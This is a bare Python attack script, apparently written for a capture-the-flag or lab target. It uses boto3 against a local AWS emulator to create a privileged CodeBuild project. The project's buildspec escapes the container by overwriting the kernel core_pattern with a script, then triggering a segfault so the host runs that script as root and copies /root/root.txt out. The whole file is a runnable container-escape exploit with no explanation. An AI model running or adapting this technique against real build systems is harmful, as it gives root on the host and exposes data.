import boto3

client = boto3.client(
    "codebuild",
    endpoint_url="http://172.18.0.2:4566",
    aws_access_key_id="test",
    aws_secret_access_key="test",
    region_name="us-east-1"
)

project_name = "escape-project2"

buildspec_content = r"""
version: 0.2
phases:
  build:
    commands:
      - id
      - cat /proc/self/mountinfo | grep upperdir || true
      - UDIR=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)
      - echo "UDIR=$UDIR"
      - printf '#!/bin/sh\ncat /root/root.txt > "$1/root.txt"\n' > /x.sh
      - chmod +x /x.sh
      - echo "|/x.sh $UDIR" > /proc/sys/kernel/core_pattern
      - ulimit -c unlimited
      - bash -c 'kill -SEGV $$'
      - sleep 2
      - ls -la "$UDIR" || true
      - cat "$UDIR/root.txt" || true
"""

client.create_project(
    name=project_name,
    source={
        "type": "NO_SOURCE",
        "buildspec": buildspec_content
    },
    artifacts={"type": "NO_ARTIFACTS"},
    environment={
        "type": "LINUX_CONTAINER",
        "image": "floci/floci:latest",
        "computeType": "BUILD_GENERAL1_SMALL",
        "privilegedMode": True
    },
    serviceRole="arn:aws:iam::847219365028:role/service-role"
)

print("[+] Progetto creato. Avvio build...")
client.start_build(projectName=project_name)
